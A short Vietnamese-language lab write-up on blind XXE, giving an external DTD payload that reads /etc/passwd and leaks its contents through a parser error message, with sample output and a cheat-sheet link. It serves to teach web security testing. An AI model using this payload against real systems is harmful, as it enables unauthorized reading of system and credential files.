## Exploiting blind XXE to retrieve data via error messages

Theo description thì same Same lab này sẽ lợi dụng thông báo lỗi để chúng ta có thể lợi dụng vào đó mà khai thác.

> Thông báo lỗi sẽ là error cái đường dẫn /invalid/ gì gì đó.

Đoạn code bên Exploit Server sẽ như thế này

```XML
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'file:///invalid/%file;'>">
%eval;
%exfil;
```

> Có nghĩa là biến file sẽ nhận giá trị trả về từ file passwd, còn eval nếu có error sẽ in ra error kèm với thông tin của biến file.

Store lại rồi quay sang request checkStock, ta sẽ gọi tới url của file .dtd của exploit server

![](/imgs/XXE/25.png?raw=true)

Chúng ta có thể thấy hàng chữ xanh

> "XML parser exited with non-zero code 1: /invalid/root:x:0:0:root:/root:/bin/bash => Tên lỗi /invalid/nội dung file

![](/imgs/XXE/26.png?raw=true)

### Tài Liệu Tham Khảo
- Một số CheatSheet: [https://web-in-security.blogspot.com/2016/03/xxe-cheat-sheet.html](https://web-in-security.blogspot.com/2016/03/xxe-cheat-sheet.html)